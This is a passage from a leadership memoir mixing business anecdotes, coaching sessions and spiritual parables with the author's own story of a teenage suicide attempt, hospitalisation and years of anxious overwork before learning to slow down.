lead—our identity; our sense of\nself; our self-esteem; our deeply held beliefs about what it will take to feel\nloved and safe and that we belong, as well as that most the basic ability to\nprovide for ourselves and our loved ones, seems to implode.\n\nAll too often we break down in the work of becoming a CEO, a manager,\na leader. But in that breaking is the promise of a making.\nI’ve seen it happen before. Take Steve Kane, for example, co-founder and\nformer CEO of Gamesville. Back in the old days, in June 1999, when I was\na venture capitalist and a partner to Fred Wilson in Flatiron Partners, we’d\ninvested in Gamesville. The company was one of the fastest-growing\ngaming and entertainment sites around. More to the point, it was fun. (One\nof their bumper sticker logos: WASTING YOUR TIME SINCE 1996!)\n\nA few months after we put a financial stake in the business, investment\nbankers began calling: “Let’s take you public!” Back then, any company\nwith revenue could sell itself to the public capital markets, and the investors\nand founders could cash out. It was the thing to do then. What’s more,\nGamesville was going to be profitable. Hell, we were all going to be rich.\n\nBut then Lycos, Inc., came calling. Back then, BGB—“before Google,” as\nI like to put it—Lycos was one of the big search engines, and they were\ncollecting sites and building out their portal business. They offered more\nthan $230 million for Gamesville.\n\nFor Steve and his colleagues, it would mean they would be rich and\nwould not have to be subject to the intense scrutiny and unrelenting\ncriticism from public market investors who know little about your company\nand make money simply on the movement—up and down—of your stock\nprice.\n\nThe board of directors wanted Steve to reject the deal. The collective\nsentiment was that the company would be better off going public. “Better\noff,” defined as making everyone more money in the short term. Steve had\nhis doubts.\n\n“Jerry, my Dad worked his whole life building his company,” I remember\nhim telling me.\n\n“He died, and I liquidated the company and gave my mother a check for\na few million dollars. Taking this deal will mean millions to me and my\nfamily,” he continued. “I’d be a fool to turn this down.”\n\nYears later Steve told me that he’d “had the great good fortune to learn a\nton from working with a father who was an entrepreneur—though he never\nused that word.”\n\n“He was full of juicy, fun nuggets of wisdom,” Steve said, “things like\n‘Never be ashamed to make a profit.’ and ‘The goal is to buy low and sell\nhigh, not buy lowest and sell highest.’”\n\nMonths later, when we would have been preparing to go public, the stock\nmarket crashed, and the door for IPOs slammed shut for companies like\nGamesville. Steve had been lucky and prescient. He’d also followed his\nfather’s advice to focus on selling high, not at the highest, and the result\nwas wonderful for him, his co-founders, and his investors. More to the\npoint, Steve also become a leader in the process of deliberating over the\ncompany’s future—and his own.\n\nHis crucible moment wasn’t merely that he correctly foresaw that going\npublic wasn’t right for Gamesville. And it wasn’t merely that he knew that a\nbird in his hand was worth more than the millions in the bush. It’s that he\nhad stayed in touch with where he was from and what had formed him. He\nremembered that he was the son of an entrepreneur, a scrappy, end-the-day-\nwith-more-money-than-you-began entrepreneur. His dad and my iceman\ngrandfather would have loved to play cards together.\n\nOr consider Alex, one of the first CEOs in whom I invested back in the\ndays of Flatiron Partners. Months after we closed our investment in his\nstart-up, months after the company had been chugging along to build out\nthe service that had been promised in the business plan, Alex called a board\nmeeting.\n\n“Tt’s not going to work,” he told the board two months before the launch.\nI was in shock. “What?” I asked myself, “How could he know this?”\n\n“T just know,” he said, as if to answer my silent question. He offered two\nchoices: pull the plug on the business and return the remaining money to\ninvestors or let him fire everyone, except for his CFO, and give them a\nmonth to come back with a new plan. If we liked the plan, we'd use the\nremaining capital to fund the new business; if we didn’t, we'd pull the plug\nthen.\n\nWe chose the second path. This two-man operation re-launched the\nbusiness, and two years later we sold the company for five times what we\npaid to invest.\n\nAlex’s crucible moment was the stark realization that the company\nwasn’t going to work. I often think of Alex when I work with clients today.\nThat start-up still had plenty of cash in the bank. The company still had\ninvestors who believed in its leadership. And it hadn’t yet had customers\nfailing to buy the service. But Alex had the presence of mind, the\nsteadfastness, and the courage to confront reality.\n\nThat resolve to do what was right—to offer his investors the opportunity\nto back out and take back their money—enabled all of us to pull closer\ntogether and focus on executing a strategy that would work. Indeed, it was\nhis courage and honesty that enabled our group to come together. That\nexperience taught me something else about the crucible moment: when the\nleader moves through that moment, it enables those around them to grow as\nwell.\n\nI remember the moment in the board meeting when I realized what Alex\nwas saying. I realized that the money I had just invested on behalf of my\nfirm might be lost. But while Alex and the other board members were\nequally scared, they believed and trusted each other, having first come\ntogether in a previous company, also led by Alex. They believed in each\nother.\n\nSo, terrified that I was going to lose my firm’s money, I, too, held myself\nsteady.\n\nI trusted in the honesty with which we faced the challenge.\n\nTwo years later we sold the company for a substantial return on\ninvestment. But I gained something more than cash. I received a powerful\nlesson in facing reality when something is failing, in trusting the team, and\nin holding oneself steady. I learned the power of the warrior pose.\n\nThe only answer, the only balm against the inevitable, existential pain of\nbecoming the leaders we were born to be is to see the lessons implicit in the\npractice of becoming.\n\nThat’s the true message of Warren Bennis’s crucible. The magic, the\nalchemy, occurs when what we do mixes with who we are and is cooked by\nthe heat of what we believe.\n\nThe Buddhists teach that for the steadfast warrior to emerge, we’ve got to\nbreak open our hearts to what is.\n\nThe Warrior\n\n“Stand up,” I tell him. We are in Chad’s office; the mini-fridge he keeps\nstocked with cans of seltzer is humming. His tiny cloth handmade KEEP ETSY\nWEIRD banner hangs from his handmade bookcase. His guitar rests in the\nhandmade stand. I repeat myself: “Come on... I’m serious . . . stand up.”\n\nSo, he stands, shoulders slumping. His sheepish grin tells me what’s on\nhis mind: “Oh, Jerry, now what are you going to make me do?” He trusts\nme, though, and he’s used to me pushing him.\n“Stand with your feet shoulder-width apart,” I tell him. “Straighten up.\nMake your back firm but not tight.“ He complies. “Now drop your arms to\nyour sides and turn your palms out, spreading your fingers.” His slight\nswaying slows until his feet are in firm contact with the floor, the Earth.\n\n“What do you feel?” I ask.\n\n“Strong but . . .” he hesitates, “but also exposed.”\n\nExactly so. Strong back and open heart. This is warrior stance, I tell him.\nThe strong back of fiscal discipline. The strong back of clarity and vision,\nof drive and direction. The strong back of delegating responsibility and\nholding people accountable. The strong back of knowing right from wrong.\n\nBut it’s also the open heart. It’s giving a shit about people, purpose,\nmeaning. It’s working toward something greater than merely boosting your\nego, greater than just soothing your worries and chasing your demons away.\nIt’s leading from within, drawing on the core of your being, on all that has\nshaped you.\n\nParker Palmer, whose grace, simplicity, and elegance have meant a great\ndeal to me, likes to explain the concept of leading from within with a\nHasidic tale he’s taken from the philosopher Jacob Needleman:\n\nA disciple asks the rabbi: “Why does Torah tell us to ‘place these words\nupon your hearts’? Why does it not tell us to place these holy words in our\nhearts?” The Rabbi answers: “It is because as we are, our hearts are closed,\nand we cannot place the holy words in our hearts. So, we place them on top\nof our hearts. And there they stay until, one day, the heart breaks and the\nwords fall in.”\n\nThe warrior stance, I tell Chad, is the only true way to meet reality. The\nwarrior stance creates the conditions in which our inner and outer begin to\ndance together. The warrior stance allows us to say, “Here I am, mess and\nall, do with me what you will.” The toughest aspect of being a leader—hell,\nof being an adult—is meeting the world as it is and not as we wish it to be.\nThe demons of the world, the demons of your soul, require just one thing:\nyour broken-open heart.\n\nEat Me If You Wish\n\nThere’s a story told of Milarepa, the great Buddhist saint and teacher. It’s\nsaid that one day he left his meditation cave to gather firewood. When he\nreturned, the cave was filled with demons. I like to think of them as little\nbats, flying around the cave, making a nuisance of themselves.\n\nUnsure of what to do, he begins to wave his arms at them, trying to get\nthem to leave the cave so that he can go back to his meditations in peace.\nBut they don’t leave. Instead, they multiply. So, Milarepa becomes very\nclever. He says to himself, “I will teach them the dharma, the teachings of\nthe Buddha.” And the demons all quiet down and sit still. But Milarepa\nnotices that, while the demons are quiet, they haven’t left, and their number\nhasn’t diminished.\n\nBecoming slightly wiser and mildly more adult, he asks the demons,\n“What are you here to teach me?” One by one, the demons disappear.\n\nPleased with himself, Milarepa goes back to his meditation but realizes\nthat one demon remains, a big, hairy bloodcurdling demon with big green\neyes and bloody fangs. Shaking, terrified, Milarepa puts his head into the\nmouth of the demon and says, “Eat me if you wish.” With that, the demon\nvanishes.\n\nSurrendering to the demons that torment you and your organization\ndoesn’t mean abdicating your responsibilities to manage. You are still\nresponsible for dealing with the reality of what is. You are still required to\nhave the strong back, for example, of knowing when you’re wrong.\n\nIn some cases, as at Alex’s start-up, the demon is that you have the wrong\nvision for the company. In others, it may be that you’ve hired the wrong\npeople. In still others, it may be your own failings—like an inability to\nadmit that you’re wrong.\n\nBut in all cases, allowing yourself to be eaten by the demon that remains\n—acknowledging how you have contributed to the problem without\ndescending into pointless self-flagellation—turns up the heat beneath the\ncrucible. Without heat, there is no alchemy.\n\nI remember one client, a CEO. Both she and a co-founder had a host of\nphysical ailments—migraines and stomach problems. More to the point,\nthey’d both argued relentlessly with each other. The arguments had gotten\nso bad that neither could stand to be in the same room with the other. Even I\nwas exasperated. During one late-night call, I asked my client to forget, for\na moment, whether her co-founder was right or wrong. “I don’t care who’s\nright,” I yelled in frustration. “The only thing we have to focus on is what\nare you supposed to be learning from this.”\nThere was a long silence. I thought, “Okay. You’ve really pushed her too\nfar. You and your woo-woo ‘lessons in the pain’ crap.” But then: alchemy.\nShe opened up and put her head into the mouth of the demon.\n\n“This is really shameful to admit,” she began, “but I know I’m a pain in\nthe ass, because I have to be right, all the time. I know it’s wrong, but I\ncan’t stop myself.”\n\nWith that, we had something to work with. I pressed her: Given this\ntendency, what do you really believe? What values do you hold? What kind\nof company do you want to build? And what kind of adult do you want to\nbe?\n\n“Why?” I asked inelegantly and in a very uncoachlike way. “Why do you\nneed to be right?”\n\nShe released a deep breath, a sigh, “Because if I was wrong, my Dad\nwould wipe me out.” And the tears flowed, and the sobs took even my\nbreath away. “I was never sure I was safe. I had to prove myself worthy\nevery night. He would grill me over dinner about my day and the choices I\nhad made. I learned early on that the only way to survive was to be right.”\n\nOver the next few weeks, on guard for her need to be right, we carefully\nwent to work changing her approach to the co-founder. For her, the crucible\nmoment came in facing her shame, acknowledging who she really had been.\nAs a result, she got to choose how she wanted to manage, what kind of\ncompany she wanted to work for, and who she wanted to be as a leader.\n\nWe forge our truest identity by putting our heads into the mouths of the\nscariest demons, the realities of our lives. Only by facing our fears, our\nprejudices, our passions, can we transform the energy that is the source of\nour aggression, the source of our confusion, the source of our struggle.\n\nWhen I was a young man, I’d often lament to Dr. Sayres about my own\nfears as a manager. After a series of infuriating questions, she got me to\nadmit that I was trapped by my own beliefs about success. Then came the\nadmission that I would never be satisfied until I was as successful as Bill\nGates.\n\nSo many young leaders struggle with the tendency to compare\nthemselves, often unflatteringly, to better-known leaders—leaders such as\nBill Gates or, even and despite his controversial character, Steve Jobs.\n\nYears ago, Joel Spolsky, the co-founder of companies such as Fog Creek\nSoftware, Trello, and Stack Exchange, took the “Steve Jobs Question”\nhead-on:\n“And yes, you’re right,” he once wrote, Steve Jobs created one of the\nmost successful companies in the history of humanity and he “. . . was a\ndictatorial, autocratic asshole who ruled by fiat and fear.” But, importantly,\nhe pointed out “you are not Steve Jobs.” Meaning, you are not as bright as\nSteve was. More important, though, you don’t have to be like Steve to\nsucceed.\n\nI wasn’t and—importantly, had no need to be—Bill Gates. Indeed, I often\nthink of the teaching of Jesus. It’s a lesser-known teaching from the one of\nthe Gnostic Gospels, the Gospel of Saint Thomas:\n\n“Tf you bring forth what is in you, what is in you will save you. If you do\nnot bring forth what is in you, what is in you will destroy you.”\n\nJesus taught a truth: the only choice that doesn’t destroy you is to bring\nforth who you were meant to be. The alchemy of becoming yourself is the\nultimate magic act and fullest expression of leadership.\n\nIn all these thoughts I read a steady, consistent wisdom: the wisdom of\nknowing yourself and your own beliefs and living them. Enduring the\nalchemical crucible requires developing the capacity to reflect, to turn the\npain of the everyday life as a leader into lessons. Every wisdom tradition\nI’ve ever encountered demands the same thing: we must go inward.\n\nAs my friend the poet Padraig O Tuama would say, “Hello to knowing\nthe story of yourself.”\n\nThat’s often the biggest obstacle to becoming yourself. The frenzied,\nfrenetic, “do it now, answer the e-mail now or the company will die, even\nthough it’s three a.m.” attitude is precisely the wrong process of becoming\nyourself.\n\nBrokenhearted Warriors Lead Best\n\nBack on the roof, Chad and I talk of life, love, and loss; the inevitable,\npainful path of change; the impermanence of all things. The story of my\nfriend Chad is a story of movement, of change. It’s the story of a boy, a\nnative son of North Carolina, a scholarship recipient at Duke University, a\ntrue Tar Heel, who grew up to be the CEO of a multibillion-dollar company.\nAnd grow up he did. It’s the story of man whose loss of status has made\npossible the claiming of something even greater: his truest self.\nThat’s the greatest crucible of all: Learning to bring forth not only what is\nin you but the whole of you, the glory of you as well as the mess of you.\nTaking your seat, putting your head into the mouth of all the demons of\nyour life and challenging them to eat you if they wish. Taking these steps\nallows you to take on more than your leadership; it allows you to sit like\nroyalty, like someone who belongs at the table, deserving of having become\nthe person you were always meant to be.\n\nHello to humans who occupy the fullness—the glory and the mess—of\ntheir lives. Hello to broken-open-hearted warriors. Hello to the leaders this\nbroken world needs most. Hello to being the leader you were born to be.\nHello to warriors with broken-open hearts.\n\nThere is no one way, but there is one requirement: to go inward. Sitting\nstill, hanging out in the spaces between the frames of life speeding by: that\nis the path to radical self-inquiry.\n\nJournaling Invitations\n\n* How can I lead with the dignity, courage, and grace\nthat are my birthright?\n\n* How can I use even the loss of status and the\nchallenge to my self-esteem inherent in leadership\nto grow into the adult I want to be in the world?\n\ne At the end of my tenure in my current position, what\nwould I like to feel about myself?\nChapter 3\nStanding Still in Empty Time\n\nT know what it’s like to be lost. I know what it’s like to be found. I want to\ntell you how to recognize when you’re lost. I want you to know how to be\nfound. I want to tell you how I learned to stand still so that you, too, can\nlearn to stand still. The poet David Wagoner writes: “The forest knows /\nWhere you are. You must let it find you.”\n\nTo let the forest find you, he says, you’ve got to stand still.\n\nI ended my teen years in the locked psych ward of Cabrini Hospital in\nManhattan. There are two kinds of psych wards: locked and unlocked.\nThose who spend time in a locked ward are considered a danger, either to\nthemselves or to others. Being on the inside of locked is dreadful. 11 never\nforget the click of the lock falling into place as my friends and family,\nvisitors, would leave me behind.\n\nThe pain, terror, and dislocating confusion of my childhood had left me\nfeeling that I’d had no other options. I was journaling then but didn’t have a\nvoice. I could only sputter an incomplete and inchoate description of what\nwas going on in my heart.\n\nShortly after my eighteenth birthday—on January 2, 1982, sitting at my\ndesk in a bedroom in a home in Ozone Park, Queens, a home my father had\ninherited from his parents, a building they’d purchased in the 1920s, a home\nin which I and some, but not all, of my siblings lived with our parents—I\nused an X-Acto knife to trace lines across my wrists, back and forth, back\nand forth, until the skin on each side of the line I’d traced separated and\nfirst tiny drops and then a river of blood appeared.\nA night in the emergency room at Jamaica Hospital was followed by a\nmandatory three days in Creedmoor State Hospital, in a locked room where\na burly West Indian attendant stood watch over me—I was on suicide\nwatch. This was followed by a three-month stay at Cabrini Hospital, behind\nanother locked door.\n\nOne of the ways I’d coped with my childhood and teen years was by\ndoing. I perfected the art of doing. I was busy—always busy. In addition to\ndoing well academically through most of my school years, I was involved. I\nwas involved in plays, student government, local politics. When I ran out of\nthings to do, I’d take on more commitments.\n\nThe most familiar bodily sensations of my childhood, those that didn’t\ninvolve my being teased and bullied by siblings or kids such as Pablo, were\nthose of my heart racing and beads of sweat running down my temples.\n\nWhen I left Cabrini, I took up where I'd left off and began doing again.\n1۰4 moved out of my parents’ house and into my sister Mary’s place. I got a\njob as, first, a busboy and then as a waiter and worked late into the night. I\nwent back to school, Queens College, that September. While I was\nsupported financially—for example, despite her own constraints, my sister\nMary sent me fifteen dollars a week so that I could pay for therapy—I was\non my own; ending my teen years early, I promoted myself into manhood.\n\nI was behind in my classes, so I doubled up, taking more than the usual\nshare of credits. What’s more, despite the incredibly cheap tuition of, I\nrecall, $750 a semester, I never had enough money. I took first one job, then\nanother, and then still another. I spent the next few years in constant motion.\nTherapy, subway rides, classes, and work dominated my life.\n\nLooking back, I see all those subway rides, all that motion, as an attempt\nto gather lemon drops. My twisted logic went like this: I didn’t have any\nlemon drops, and therefore felt exhausted and depleted and constantly\nbattled migraines, because I wasn’t doing enough. The answer, therefore,\nwas simple: Do more, faster.\n\nI raced through my days. From class, to therapy, to work, to class. The\nbus to the train to the bus to the train. Sometimes the only sleep I’d snatch\nwas on the grass on the quad on campus, a pleasant place to rest, or in the\nart library (not the regular library, that was too noisy). Beads of sweat\nflowed down my temples and the back of my neck.\n\nMy meals consisted mostly of oatmeal; it was cheap and temporarily\nsated hunger. I’d fill a large thermos with Quaker Instant Oatmeal and eat\nthat all day long.\n\nOne night, after a fourteen-hour day that included ninety-minute subway\nrides to and from the Queens College campus, I collapsed onto my mattress\nin the makeshift bedroom I’d created in the dining room of the apartment I\nshared with my brother Dominic. I lay there, sweating, gasping, shaking.\n\nId fallen asleep in the clothes I’d worn the day before. I woke a few\nhours later to the sounds of violence, as the bookshelves I’d installed as a\nmakeshift closet in my makeshift bedroom ripped out of the wall and\neverything I owned tumbled down on top of me. I lay there, covered in\njeans, underwear, T-shirts, and twisted metal shelving.\n\nBreathless, Dominic came rushing in: “Are you all right?”\n\n“Yes,” I mumbled, and went back to sleep, not even bothering to throw\noff the piles that had rained down on me.\n\nA few months later, I found myself desperate and anxious. The spring\nsemester had started, and I had been dodging notices from the bursar’s\noffice. Weeks into the semester, I still hadn’t paid my tuition; I couldn’t\nscrape together the $750.\n\nRobert Greenberg was my favorite professor. His love of poetry,\nespecially that of the Romantics, fueled my earliest love of poetry. Looking\nevery bit the academic, he sported a close-cropped gray beard and wore\nsmall, round glasses beneath his balding head. I can still hear him quoting\nfrom William Blake’s “The Chimney Sweeper”:\n\nAnd my father sold me while yet my tongue\nCould scarcely cry “’weep! ‘weep! ’weep! ’weep!”\n\nProfessor Greenberg was also my adviser. One day, with the weight of the\nunpaid tuition bearing down on me, I confessed to him that I’d be leaving\nschool. I couldn’t pay my tuition. I weep now as I remember his reaction:\n“Well, that’s not going to happen.” He paused, wiping his glasses slowly\nand then putting them back on. “You’ve just won a scholarship that will pay\nyour tuition until you graduate.”\n\nHe explained that he was the only judge in a competition and had decided\njust then that he couldn’t think of a more deserving student.\n\nThe scholarship was given by a small publishing company on Long\nIsland. CMP Media had been founded by a husband-and-wife team, Gerry\nand Lilo Leeds. Lilo, who was Jewish, had grown up in Germany in the\n1930s and left before the Nazis turned the country into a hell. She went to\nQueens College and established the scholarship. I was the first recipient.\n\nAt the meeting with her in the president’s office to pick up the\nscholarship check and take photos for the school newspaper, I fast-talked\nmy way into an internship for the summer.\n\nI began working at InformationWeek, a weekly newsmagazine covering\ntechnology and business. By the end of the summer, despite the fact that I\nknew nothing about technology or business, I fast-talked my way, again,\ninto a part-time job as a reporter.\n\nTwo years later, having taught myself a few things about technology and\nbusiness, I finished school and became a full-time reporter. Two years after\nthat, having taught myself a few things about leading and managing, I was\npromoted first to news editor and then to editor of the magazine.\n\nWhen I was twenty-one, I had lain under a pile of worn-out clothes,\nwaiflike and malnourished. Four years later, at the age of twenty-five, I was\nthe editor of a magazine with four hundred thousand readers and a staff of\nforty.\n\nThe next few years were even more of a blur. No. Not a blur because of\nmemory or the passage of time. They were a blur because motion was\nfollowed by more motion, beads of sweat were followed by more beads of\nsweat.\n\nI still hadn’t acquired enough to begin to feel safe, but at least I was\neating more than oatmeal. Looking back now, I remember that time as one\nin which I seemed to barely occupy my body. But that realization came later\n—much later—when I came to understand that one of the by-products of\nstanding still is to fully occupy the meat bag that is your body.\n\nI still remember the feeling of moving through work as if I were the\nMarvel superhero the Flash. I’d race from floor to floor, meeting to\nmeeting, imagining that my cheeks were blown back and puffed out, as in\nthe pictures of those guys in the 1960s who’d broken the land-speed\nrecords. I still remember watching my colleagues moving slowly, as if they\nwere underwater. Even now, my heart still races at the thought of closing\nthe last form, the last eight pages of the magazine, on Friday morning, when\nwe’d scramble to fit in the latest-breaking news.\n\nI know now that, despite what my frantic mind told me then, the constant\nmotion wasn’t a requirement of the job I’d chosen. But producing a weekly\nmagazine with daily deadlines was the perfect job for someone who\nmistook motion for meaning. Everyone thought I was thriving but, on the\ninside, I was dying.\n\nThe non-occupation of my body was obvious to those who cared to look\nclosely. I was busy, I was alert and active, but I wasn’t really present in my\nlife. My eyes darting from one person to another, listening without hearing\n—I wasn’t really attending to my life, and I wasn’t really connecting to the\npeople who mattered most to me.\n\nIn so many ways, the world affirmed this way of being. I was rewarded\nwith promotions. Years later, and with the benefit of thousands of hours of\nintrospection, I understand why the world affirmed this way of being. When\nI moved fast, when I spent my days not truly occupying my life, not\nstanding still, not being real, I found it easier to live in accordance with\nother people’s expectations. By not standing still, I was able to be the object\nof everyone else’s projections of who and what I should be. Too busy to live\nmy own life, I took direction from the affirmations of others.\n\nSince the world needed an editorial wunderkind to direct a magazine\nabout technology, I’d readily put aside my love of writing and poetry and\ntook on the mantle of being a technologist. My family, I thought, needed\nsomeone who was happy, smart, and capable, and I donned the cape of the\ngood student, the fast-rising executive, who was also everyone’s friend.\n\nBut this act deafened me to my own voice and numbed me to the urges of\nmy own body—for sleep, for recovery, for love, for the poetry that soothes\nmy soul.\n\nThe world loved my doing. But the more the world applauded, the more\nmy soul ached. “My soul was a burden, bruised, and bleeding,” wrote Saint\nAugustine, “It was tired of the man who carried it.” I was growing tired of\ncarrying my soul.\n\nThis strategy of moving quickly was not unlike another survival strategy\nI had developed as a child, my hyperawareness of the Other’s sense of\nbeing. As a boy, I could discern Dad’s mood by the way he walked down\nthe hallway to our ground-floor apartment. If he shuffled, I knew he was\nslightly drunk; if his shoes clicked on the hallway linoleum, then he hadn’t\nstopped at a bar on the way home from work. On a good night, I could\nmake it to bed before he was drunk.\n\nIndeed, I was always on guard. I’d listen and watch my parents with great\nintensity. As Dad worked his way through his nightly Pabst Blue Ribbons,\nhis words became looser, his enunciation less clipped. If I was unfortunate\nenough to be awake before he started his second six-pack of beer, I could\nfeel the tension in my mother build. She hated his drinking, and he drank\nevery night.\n\nThe indications of her mounting duress were less visible but no less\nvisceral. She’d light a cigarette and begin moving about the kitchen, picking\nup and then just as briskly putting down objects: ashtrays, glasses, the little\nreplica of Christ’s crucifixion my brother Dominic had made; anything,\nreally, she touched. The ritual movement—snatch it up, move it slightly, put\nit down—would slowly spread and deepen in intensity until it felt as if, with\neach putting-down, my whole world was nearing implosion.\n\nOften, suddenly, an ashtray would be slammed down, and Mom would\nbegin muttering first under her breath and then louder and louder, speaking\nto everyone and to no one in particular. No one, that is, that might be in the\nroom.\n\nSome nights it was Jesus. Some nights it was the late Bobby Kennedy—\nmaybe even Art Garfunkel.\n\nAs Gunsmoke or Mutual of Omaha’s Wild Kingdom played on the black-\nand-white TV, my ears would prick up, scanning for the threat. As the\nwords flowed, and as the night promised to pass in another endless torrent\nof words, the rest of us, sometimes all seven of us kids, would tighten, go\nsilent, cower slightly, each pretending to just watch the cheetah eat an\nantelope or Sheriff Matt Dillon capture the bandit without shooting him.\n\nThe worst storms were those when Dad engaged Mom, answering her\ncomments about his infidelities, his drinking, his having been given up at\nbirth to be adopted by Grandma and Grandpa Colonna.\n\nOver time, hyperawareness became part of my character, part of me. It\nbecame, as I’ve often joked, a superpower. Even today, when I work with\ncoaching clients, I track every bob of the Adam’s apple, every pause in the\nstory (where it occurs, what words preceded and followed it, where their\neyes move when they pause), to brace for the coming storm or, even more,\nto discern what they might need, right then, in that moment. If I give them\nwhat they need, says my little boy, they will be saved, and if I’ve saved\nthem, then I’ll be safe.\n\nThat hyperawareness, married to the quick-change nature of my\npresentation of self, gave me the ability to meet everyone’s expectations of\nwho I should be.\nMy propensity for speed and busyness and my ability to read others were\nmatched by an insatiable curiosity. I read constantly. I devoured books,\nideas, and information. And I asked questions, lots of questions.\n\nEven today, the questions I ask can be unsettling. When used well, people\non the other side of the question can feel an uncanny and unexpected sense\nof being truly seen. When not used well, they can feel like they’re facing an\ninquisition, with my hypervigilance creeping back up and threatening to\nbreak the fragile connection between us.\n\nThese traits—insatiable curiosity, a driving need for speed, the ability to\nread people, and the ability to anticipate problems before they arise—led\nothers to view me as a rising star, a wunderkind. Quite a transition for a guy\nwho, only a few years before, had been a psych patient in a locked ward.\n\nAnd yet, even as I progressed in my career, the beads-of-sweat years\ncontinued.\n\nMy Radical Self-Inquiry\n\nAs 1994 began, I left CMP, left journalism, and helped form a venture\ncapital firm, CMG@Ventures. At CMG, we were among the first firms to\nfocus specifically on opportunities emerging from the newly developed\nWorld Wide Web.\n\nLeaving the media business only intensified those beads-of-sweat years.\n\nTwo years later, I was on the move again. I left CMG@Ventures to form\na new venture capital firm with Fred Wilson. On the surface, Fred’s ten\nyears’ experience as a venture capitalist (VC) and a Wharton MBA made\nhim the perfect partner for me, a guy who could barely read a profit-and-\nloss statement. But, more to the point, we both cared as much about how\nsomething was done as we did about the outcome.\n\nFlatiron Partners was founded in June 1996, and the media quickly hailed\nus for creating a technology-focused venture capital firm based in New\nYork City. We weren’t the first. And we hadn’t made any investments, so no\none could tell whether we’d be any good. But the press loved the story, and\nwe were on the front page of the business section of the New York Times\nand several other financial outlets.\n\nA few weeks after officially launching Flatiron Partners, I was walking\non the beach with my kids. Seagulls darted and wheeled through the sky,\nthe birds’ cries mixing with the sounds of the surf pounding the shore. We\nwalked through a tunnel under the boardwalk, in search of a bathroom and\nice cream. Stepping into the cool dark, I felt relief from the face-melting\nsun. Stepping back into the light, I was struck to my knees by a blinding\npain that ripped across my skull.\n\nI fell to the ground, writhing.\n\nI drifted in and out of consciousness and came to in an emergency room.\nNo one could make sense of the headache that had ripped through my skull.\nA spinal tap was performed, bringing with it a fresh round of nausea.\n\nAfter a week in the hospital and a battery of tests, the neurologist\nconcluded, “Probably cluster headaches.” Probably, he said, but he could\nfind nothing physically wrong with me. Fred, my business partner, raised a\nproper Catholic, with innumerable ways to feel guilt, was convinced that,\nbecause of the timing of the headache—one week after we had announced\nthe formation of Flatiron, it was his fault. My then-therapist Dr. Sayres had\nother ideas.\n\nI sensed that she’d grown frustrated by my frequent headaches. It wasn’t\nuncommon for me to be woken from a deep sleep with a skull-splitting\nheadache, for example.\n\nFollowing that incident, she began helping me connect the dots between\nmy waking-world stresses from things such as the busyness, the\nhyperawareness, and my propensity to shape-shift to fit the scene, often\nwithholding even from myself my most deeply held feelings. In those\nweeks, she began pushing me to ask myself one simple question: “What am\nI not saying that needs to be said?”\n\nLooking back, I realize this time as the beginning of my own radical self-\ninquiry. My pain helped me realize that I was lost. My soul, no longer\ncontent to be “bruised and battered,” took charge of my body and grabbed\nthe attention of my conscious mind. The headaches, which continued even\nas the self-inquiry began, became a way for my body to say, in effect,\n“Wake the fuck up.”\n\nFor, if I didn’t wake up, my soul was going to drop me to my knees,\nwrithing in pain.\n\nIn therapy with Dr. Sayres, we unpacked the months preceding the vomit-\ninducing cluster headaches. I was in a job I couldn’t stand. I was working\nwith people I couldn’t trust. I was living a life that was not my own. I was\nliving, as Parker Palmer would describe, “divided,” where the inner me\ndidn’t match the outer me. I was just thirty but already the years of living\nlife at a beads-of-sweat pace, of moving forward even though I was lost,\nwere exacting their price. But I was obstinate and thick-headed. The lesson\nthat began on the beach that day took years to sink in. I put on my\nsuperhero cape once again and doubled down on my strategy.\n\nFlatiron Partners unfolded in glorious ways. For years we were\ncelebrated, feted. Part of that feting seems warranted; from all appearances,\nit seemed we could do no wrong. Every investment made money. But the\naccolades we received as a firm felt a bit like the affirmations I’d received\nas a rising star—false in that they were based not on our values, our shared\nsense of purpose, but on the whimsy of whether we were making money.\n\nIf there was a conversation about the emerging technology scene in New\nYork, we were called. Sometimes we were chastised as part of all that was\nwrong with the growing fascination with all things Internet.\n\nNevertheless, I continued to move fast and do more. I vividly recall\ncoming off the elevator and heading into the office and panting in\nanticipation and fear of what might be coming at me from around the next\ncorner.\n\n“If ’m Not Panting, I Feel like ’m Not Working.”\n\nYears later, I’m coaching Victor; his shoulders are hunched, and he’s\nleaning toward me. He’s a potential new client, the co-founder of a\nstruggling start-up trying to compete in a new but already crowded market.\nHe’s come to me in confusion and looking for answers. All I have for him\nare questions: “What are you not saying that needs to be said?”\n\nHe’s got dark eyes, thick eyebrows, and a full beard. At twenty-five, he’s\nthe same age I was when I took over the magazine at CMP.\n\n“Well, I’m worried about the money,” I remember him telling me. “I\nmean this first conversation has made me feel great but is it, I don’t know,\n‘justifiable’ to spend the company’s money on making the CEO feel\nbetter?”\n\n“How much can you spend so that it feels justified?”\n\n“T don’t know,” he stammers, his thick Adam’s apple bobbing, “Seventy-\nfive dollars?”\n\n“Sold,” I say with a smile.\nHe starts to cry. “What? What is it?” I ask.\n\n“T don’t feel worthy.”\n\nVictor is an immigrant. He grew up during his country’s civil war. He\nspent most of the years of that war in bed being treated for cancer. The\nwounds from the cancer are in his body, still, but in his soul as well; “I\ndon’t feel worthy.”\n\nPerhaps it was nothing but some general fear that made him question his\nworthiness. But, nevertheless, the combination of a devastatingly\nfrightening war and a life-threatening illness left the boy with the only\nanswer his mind could grasp: “I am not worthy.”\n\nWe worked for a few years as he grew into his role as CEO. I watched as\nthe young man became just a man—no qualifier needed. Toward the end of\nour time together we began working on his struggles to commit to\nsomething beyond work. There was a girl. They were in love. And they\nfought because she “never” saw him; he was always working.\n\n“What is it?” I asked. “What’s keeping you at your desk all night? What\nstops you from, I don’t know, just taking her to the movies?”\n\n“T’m afraid!” he barked at me, as if it were obvious. “I’m afraid that if I\ndon’t work hard I’1l end up back there.”\n\n“Back there” was his code phrase for the war and the cancer.\n\n“Tm afraid,” he continued, “that if I slow down...” He hesitated. “It’s\nlike this—if I’m not panting, I feel like I’m not working.”\n\nThere it is. That same old haunting belief system. Run faster and faster,\ntelling oneself that the way to be is to do; do more, faster, and just maybe\nyou'll outrun war, cancer, and the other demons that cause you to doubt\nyour worth, your lovability, and your own voice.\n\nBut panting through work is a lousy strategy. It feeds the anxiety of never\nenough; it gets in the way of thinking clearly; and it convinces you to\nmistake motion for meaning.\n\nRecently I did an interview with a presenter from the BBC. He asked in\nthat lovely, proper, obvious way unique to BBC presenters, “But isn’t\nworking hard just a part of the job?”\n\n“Yes. Of course,” I replied. “But that’s not what we’re talking about. Tell\nme the brilliant ideas, the innovations that move an organization—a\ncommunity of people—forward that spring from panic and fear.”\n\nWhen you use your position, power, agency and the resources of a\ncompany; when you unconsciously bend 